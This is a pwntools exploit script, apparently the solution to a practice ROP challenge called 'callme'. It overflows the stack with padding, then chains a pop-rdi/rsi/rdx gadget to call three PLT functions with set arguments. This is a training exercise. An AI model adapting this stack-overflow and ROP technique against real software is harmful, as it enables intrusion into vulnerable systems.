#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template callme
from pwn import *
import offset

# Set up pwntools for the correct architecture
exe = context.binary = ELF('callme')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

def get_offset():
    io = start()
    pad = offset.offset(io)
    io.close()
    return pad

pad = get_offset()
info("pad: %s", hex(pad))

io = start()

callme_one = exe.plt["callme_one"]
callme_two = exe.plt["callme_two"]
callme_three = exe.plt["callme_three"]

pop_rdi_pop_rsi_pop_rdx_ret = 0x40093c
args = pack(0xdeadbeefdeadbeef) + pack(0xcafebabecafebabe) + pack(0xd00df00dd00df00d)

rop = ROP(exe)
rop.raw(b"\x90" * pad)
rop.raw(pop_rdi_pop_rsi_pop_rdx_ret)
rop.raw(args)
rop.raw(callme_one)
rop.raw(pop_rdi_pop_rsi_pop_rdx_ret)
rop.raw(args)
rop.raw(callme_two)
rop.raw(pop_rdi_pop_rsi_pop_rdx_ret)
rop.raw(args)
rop.raw(callme_three)

io.sendlineafter(b"> ", rop.chain())

io.interactive()
